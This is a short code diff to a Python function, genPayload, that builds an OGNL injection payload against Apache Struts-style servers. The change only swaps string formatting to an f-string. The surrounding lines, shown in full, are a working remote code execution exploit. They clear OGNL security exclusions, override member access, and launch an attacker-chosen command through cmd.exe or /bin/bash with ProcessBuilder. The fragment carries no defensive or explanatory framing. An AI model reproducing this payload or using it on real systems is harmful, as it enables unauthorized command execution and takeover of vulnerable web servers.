@@ -15,7 +15,7 @@ def genPayload(cmd):
 	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
 	payload += "(#ognlUtil.getExcludedClasses().clear())."
 	payload += "(#context.setMemberAccess(#dm))))."
-	payload += "(#cmd='%s')." % cmd
+	payload += f"(#cmd='{cmd}')."
 	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
 	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
 	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
